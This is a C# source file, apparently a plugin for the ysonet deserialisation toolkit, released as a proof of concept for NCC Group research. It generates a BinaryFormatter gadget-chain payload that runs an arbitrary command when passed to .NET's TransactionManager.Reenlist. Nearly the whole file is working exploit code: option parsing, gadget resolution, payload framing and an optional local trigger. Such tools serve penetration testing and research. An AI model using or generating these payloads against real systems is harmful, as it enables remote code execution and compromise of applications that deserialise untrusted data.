using NDesk.Options;
using System;
using System.Collections.Generic;
using System.Transactions;
using ysonet.Generators;
using ysonet.Helpers;

/**
 * Author: Soroush Dalili (@irsdl)
 * 
 * Comments: 
 *  This was released as a PoC for NCC Group's research on `Use of Deserialisation in .NET Framework Methods` (December 2018)
 *  See `TransactionManager.Reenlist(Guid, Byte[], IEnlistmentNotification) Method`: https://docs.microsoft.com/en-us/dotnet/api/system.transactions.transactionmanager.reenlist
 *  Security note was added after being reported: https://github.com/dotnet/dotnet-api-docs/pull/502
 *  This PoC wraps a BinaryFormatter payload; the gadget is chosen with -g and
 *  defaults to TextFormattingRunProperties
 *  This PoC produces an error and may crash the application
 *
 *  TransactionManager.Reenlist is a System.Transactions 2.0 API, so the carrier
 *  reaches a CLR-v2 target. Whether the PAYLOAD does is the chosen gadget's
 *  property, which is why -g exists here.
 **/

namespace ysonet.Plugins
{
    public class TransactionManagerReenlistPlugin : IPlugin
    {
        // The gadget this plugin wrapped before -g existed. Kept as the default so no
        // existing command line changes what it produces.
        const string DefaultGadget = "TextFormattingRunProperties";

        static string command = "";
        static string gadget = DefaultGadget;
        static bool test = false;
        static bool minify = false;
        static bool useSimpleType = true;
        static bool rawcmd = false;
        static bool dosAcknowledged = false;
        static bool legacyFx = false;

        static OptionSet options = new OptionSet()
            {
                {"c|command=", "the command to be executed", v => command = v },
                {"g|gadget=", "a gadget chain that supports BinaryFormatter. Default: " + DefaultGadget + ".", v => gadget = v },
                {"t|test", "whether to run payload locally. Default: {default}", v => test =  v != null },
                {"minify", "Whether to minify the payloads where applicable (experimental). Default: {default}", v => minify =  v != null },
                {"ust|usesimpletype", "This is to remove additional info only when minifying and FormatterAssemblyStyle=Simple. Default: {default}", v => useSimpleType =  v != null },
                {"rawcmd", "Command will be executed as is without `cmd /c ` being appended (anything after the first space is an argument).", v => rawcmd = v != null },
                {"legacyfx", "Target the .NET Framework 2.0/3.0/3.5 (CLR v2) generation. This reaches the GADGET only; this plugin's own 5-byte frame names no framework assembly, so it needs no rewriting. Default: {default}", v => legacyFx = v != null },
                {Helpers.Core.DosPolicy.AckOptionName, Helpers.Core.DosPolicy.AckHelp, v => dosAcknowledged = v != null },
            }
            .WithMetadata("command", new OptionMetadata(required: true))
            .WithMetadata("gadget", new OptionMetadata(defaultValue: "TextFormattingRunProperties", valueSource: OptionValueSource.Gadgets))
            .WithMetadata("test", new OptionMetadata(defaultValue: "false"))
            .WithMetadata("minify", new OptionMetadata(defaultValue: "false"))
            .WithMetadata("usesimpletype", new OptionMetadata(defaultValue: "true"))
            .WithMetadata("rawcmd", new OptionMetadata(defaultValue: "false"))
            .WithMetadata("legacyfx", new OptionMetadata(defaultValue: "false"))
            .WithMetadata("i-understand-dos", new OptionMetadata(defaultValue: "false"));

        public string Name()
        {
            return "TransactionManagerReenlist";
        }

        public string Description()
        {
            return "Generates payload for the TransactionManager.Reenlist method";
        }

        public string Credit()
        {
            return "Soroush Dalili";
        }

        // A public plugin: it is listed everywhere, with or without --display-private.
        public bool IsPrivate() { return false; }

        // Measured at BOTH ends: the LEGACY tier fires this plugin on real CLR-v2 children
        // (2.0/3.0/3.5 lanes, raw and minified), and the execution matrix observes it on
        // this machine's 4.8.1 build.
        //
        // Declared as a CONTIGUOUS range rather than just those endpoints, and that is a
        // correctness point rather than a style one. A HOLE inside a declared span is not
        // "unmeasured", it is an active EXCLUSION: ClassifyVersionEvidence returns
        // Contradiction for an observation inside the hole, and its own unit test spells
        // that out ("the gadget positively says it does not work there"). So declaring
        // {2.0,3.0,3.5,4.8.1} would FAIL the suite on any 4.0-4.8 machine the moment the
        // execution matrix fired this plugin there - a red build for a contributor whose
        // box is 4.8 rather than 4.8.1, reporting a claim that was never intended.
        //
        // ObjRef and TempFileCollection carry the identical evidence shape (CLR-v2 lanes
        // plus 4.8.1) and both declare Range(NetFx20, NetFx481) for the same reason.
        public List<string> RuntimeVersions()
        {
            return new List<string>(RuntimeVersion.Range(
                RuntimeVersion.NetFx20, RuntimeVersion.NetFx481));
        }

        public OptionSet Options()
        {
            return options;
        }

        public object Run(string[] args)
        {
            InputArgs inputArgs = new InputArgs();
            List<string> extra;
            // Reset EVERY option so an in-process prior run cannot leak into this one.
            // A partial reset is worse than none: -g in particular would stick, and the
            // next caller would silently get the previous run's gadget.
            command = "";
            gadget = DefaultGadget;
            test = false;
            minify = false;
            useSimpleType = true;
            rawcmd = false;
            dosAcknowledged = false;
            legacyFx = false;
            try
            {
                extra = options.Parse(args);
                inputArgs.Cmd = command;
                inputArgs.Minify = minify;
                inputArgs.UseSimpleType = useSimpleType;
                inputArgs.IsRawCmd = rawcmd;
                inputArgs.DosAcknowledged = dosAcknowledged;
                // Reaches the inner gadget's generation boundary only. The 5-byte frame
                // this plugin adds names no framework assembly.
                inputArgs.LegacyFx = legacyFx;
                // NOT inputArgs.Test. -t on this plugin means "run the Reenlist PoC
                // below", and the payload must be built without firing itself first.
                inputArgs.Test = false;
                // Anything this plugin did not recognise belongs to the gadget the user
                // chose with -g, so it is forwarded rather than dropped. Without this a
                // gadget option typed on a plugin command line (--var, for example) goes
                // nowhere and the operator silently gets the default variant. Only the
                // LEFTOVER args travel: an option this plugin declares was already
                // consumed by the parse above, so the two cannot collide.
                inputArgs.ExtraArguments = extra;
            }
            catch (OptionException e)
            {
                Console.Write("ysonet: ");
                Console.WriteLine(e.Message);
                Console.WriteLine("Try 'ysonet -p " + Name() + " --help' for more information.");
                throw new Exception(e.Message);
            }

            object payload = "";
            if (String.IsNullOrEmpty(command) || String.IsNullOrWhiteSpace(command))
            {
                Console.Write("ysonet: ");
                Console.WriteLine("Incorrect plugin mode/arguments combination");
                Console.WriteLine("Try 'ysonet -p " + Name() + " --help' for more information.");
                throw new Exception("Incorrect plugin mode/arguments combination");
            }

            // A user-selectable gadget goes through the shared resolver, so the name
            // rules, the denial-of-service gate and the error text match every other
            // plugin that takes -g.
            Helpers.Core.RunResult gadgetResult =
                Helpers.Core.PayloadRunner.GeneratePluginGadget(gadget, "BinaryFormatter", inputArgs);
            if (!gadgetResult.Success)
            {
                Console.WriteLine(gadgetResult.ErrorMessage);
                throw new Exception(gadgetResult.ErrorMessage);
            }
            foreach (string warning in gadgetResult.Warnings)
                Console.Error.WriteLine(warning);

            byte[] serializedData = (byte[])gadgetResult.Raw;
            byte[] newSerializedData = new byte[serializedData.Length + 5]; // it has BinaryReader ReadInt32() + 1 additional byte read
            serializedData.CopyTo(newSerializedData, 5);
            newSerializedData[0] = 1;


            payload = newSerializedData;

            if (test)
            {
                // PoC on how it works in practice
                try
                {
                    TestMe myTransactionEnlistment = new TestMe();
                    TransactionManager.Reenlist(Guid.NewGuid(), newSerializedData, myTransactionEnlistment);
                }
                catch (Exception err)
                {
                    Debugging.ShowErrors(inputArgs, err);
                }
            }


            return payload;
        }

        class TestMe : IEnlistmentNotification
        {
            public void Commit(Enlistment enlistment)
            {
                throw new NotImplementedException();
            }

            public void InDoubt(Enlistment enlistment)
            {
                throw new NotImplementedException();
            }

            public void Prepare(PreparingEnlistment preparingEnlistment)
            {
                throw new NotImplementedException();
            }

            public void Rollback(Enlistment enlistment)
            {
                throw new NotImplementedException();
            }
        }
    }
}
